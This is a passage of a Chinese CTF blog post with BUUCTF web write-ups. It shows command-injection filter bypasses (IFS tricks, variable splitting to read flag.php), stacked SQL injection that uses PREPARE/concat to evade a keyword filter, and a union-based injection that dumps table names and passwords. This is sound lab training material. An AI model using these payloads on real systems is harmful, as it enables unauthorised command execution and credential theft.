+<figure class="highlight erlang"><table><tr><td class="code"><pre><code class="hljs erlang"><span class="hljs-string">$&#123;</span>IFS&#125;<span class="hljs-string">$9</span><br>&#123;IFS&#125;<br><span class="hljs-string">$I</span>FS<br><span class="hljs-string">$&#123;</span>IFS&#125;<br><span class="hljs-string">$I</span>FS<span class="hljs-string">$1</span> //<span class="hljs-string">$1</span>改成<span class="hljs-string">$加</span>其他数字貌似都行<br>IFS<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来<br><span class="hljs-comment">%20   (space)</span><br><span class="hljs-comment">%09   (tab)</span><br>X=<span class="hljs-string">$&#x27;</span>cat\x09./flag.php&#x27;;<span class="hljs-string">$X</span>       （\x09表示tab，也可以用\x20）<br></code></pre></td></tr></table></figure>
+<p>发现$IFS$1可行。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906160956.png"><br>这里我们发现flag也被过滤了。</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>    <span class="hljs-comment"># flag的贪婪匹配，匹配一个字符串中，是否按顺序出现过flag四个字母</span><br></code></pre></td></tr></table></figure>
+<p>变量替换：<br>?ip&#x3D;127.0.0.1;b&#x3D;g;cat$IFS$1fla$b.php<br>或者?ip&#x3D;127.0.0.1;a&#x3D;ag;b&#x3D;fl;cat$IFS$1$b$a.php<br>注意不能按顺序出现flag！<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240906164613.png"></p>
+<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240909142219.png"><br>查看writeup题解后，发现题目sql查询字符串的内容为：</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">select</span> $_POST[<span class="hljs-string">&#x27;query&#x27;</span>] || flag from Flag<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<ol>
+<li><p>*查询法<br>  *,1<code>和SQL语句拼接后：</code>select *,1 || flag from Flag<code>1和flag的结果是1，然后语句就成为了  “</code>select *,1 from Flag&#96;</p>
+</li>
+<li><p>操作符重置法<br><code>1;set sql_mod=PIPES_AS_CONCAT;select 1</code><br>插入SQL语句就成为<br><code>select concat(1,flag) from Flag;</code><br>SQL_MOD：是MySQL支持的基本语法、校验规则 。其中<code>PIPES_AS_CONCAT</code>会将<code>||</code>认为字符串的连接符，而不是或运算符，这时<code>||</code>符号就像<code>concat</code>函数一样。</p>
+</li>
+</ol>
+<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>测试万能密码1’ or 1&#x3D;1 #<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910132838.png">输出了该表的所有数据，说明存在sql注入。<br>输入select，判断是否有关键字过滤。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910133825.png"><br>preg_match函数用于执行正则表达式，也就是说，系统通过该代码将select等关键字都过滤了，联合查询，报错注入，布尔,时间盲注就都不可以使用了，只剩下堆叠注入。<br>查看数据库名：1’;show databases;#<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910134344.png"><br>查看数据表：1’;show tables;#<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910134604.png"><br>获取第一个表1919810931114514的表结构，有两种方式：<br>方式一：<code>1&#39;; show columns from tableName;#</code><br>方式二：<code>1&#39;;desc tableName;#</code><br>注意，如果tableName是纯数字，需要用反勾号包裹。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910142759.png"><br>单引号 ’ 或双引号是字符串的引用符号。<br>反引号是数据库、表、索引、列和别名的引用符。<br>两者在linux下不区分，windows下区分。<br>获取字段名flag：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910143035.png"><br>由于select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字。<br><strong>预编译</strong>：相当于定一个语句相同，参数不同的Mysql模板。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> 名称 <span class="hljs-keyword">FROM</span> 	<span class="hljs-keyword">Sql</span>语句 ? ;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@x</span><span class="hljs-operator">=</span>xx;<br><span class="hljs-keyword">EXECUTE</span> 名称 <span class="hljs-keyword">USING</span> <span class="hljs-variable">@x</span>;<br></code></pre></td></tr></table></figure>
+<p>举例：查询ID为1的用户：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">方法一：<br><span class="hljs-keyword">SElECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_user <span class="hljs-keyword">WHERE</span> USER_ID <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><br>方法二：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br><br>方法三：<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@ID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">EXECUTE</span> jia <span class="hljs-keyword">USING</span> <span class="hljs-variable">@ID</span>;<br><br>方法四：<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@SQL</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;</span>;<br><span class="hljs-keyword">PREPARE</span> jia <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@SQL</span>;<br><span class="hljs-keyword">EXECUTE</span> jia;<br></code></pre></td></tr></table></figure>
+<p>输入<strong>1’;PREPARE xsh from concat(‘s’,’elect’,’ * from  <code>1919810931114514</code>‘);EXECUTE xsh;#</strong><br>注意表名加上反引号。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910145812.png"></p>
+<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p><strong>常规sql注入流程</strong>：</p>
+<ol>
+<li>判断类型</li>
+<li>万能密码</li>
+<li>判断字段数 order by</li>
+<li>找回显点</li>
+<li>爆数据库，版本</li>
+<li>爆表</li>
+<li>爆字段<br>解题步骤如下：</li>
+<li>输入1’，报错，说明是字符型注入。</li>
+<li>输入1‘ or 1&#x3D;1#。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910155412.png"></li>
+<li>order by 2,3时均没有报错。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910155757.png"><br>order by 4时报错。说明表有三个字段。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910155942.png"></li>
+<li>联合查询，判断回显点。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910160858.png"><br>发现回显点是2,3。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910161141.png"></li>
+<li>database(),version()<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910171728.png"></li>
+<li>1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’geek’ #<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910172344.png"></li>
+<li>1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’geek’ and table_name&#x3D;’l0ve1ysq1’ #<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910172852.png"></li>
+<li>1’ union select 1,2,group_concat(password) from l0ve1ysq1 #<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020240910173544.png"></li>
+</ol>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/Avatar.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/Avatar.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">xxshh</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/09/06/BUUCTF-Web-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/09/06/BUUCTF-Web-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/')">BUUCTF Web 解题记录</span></a></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">一名网安菜鸟的学习笔记</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/09/03/linux%E5%91%BD%E4%BB%A4/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">linux命令</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="toc-number">1.</span> <span class="toc-text">#[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun"><span class="toc-number">2.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">3.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">4.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec"><span class="toc-number">5.</span> <span class="toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">6.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">7.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">8.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="toc-number">9.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/06/BUUCTF-Web-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/" title="BUUCTF Web 解题记录">BUUCTF Web 解题记录</a><time datetime="2024-09-06T01:27:53.000Z" title="发表于 2024-09-06 09:27:53">2024-09-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/03/linux%E5%91%BD%E4%BB%A4/" title="linux命令">linux命令</a><time datetime="2024-09-03T06:11:48.000Z" title="发表于 2024-09-03 14:11:48">2024-09-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/02/%E7%88%AC%E8%99%AB%EF%BC%9A%E8%8E%B7%E5%8F%96ins%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E7%9A%84%E7%B2%89%E4%B8%9D%E6%95%B0/" title="爬虫：获取ins指定用户的粉丝数">爬虫：获取ins指定用户的粉丝数</a><time datetime="2024-09-02T05:35:35.000Z" title="发表于 2024-09-02 13:35:35">2024-09-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/31/BUUCTF%20Basic%20%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/" title="BUUCTF Basic 解题记录">BUUCTF Basic 解题记录</a><time datetime="2024-08-31T04:01:51.000Z" title="发表于 2024-08-31 12:01:51">2024-08-31</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By xxshh</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("31/8/2024 22:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2024 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 xxshh 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
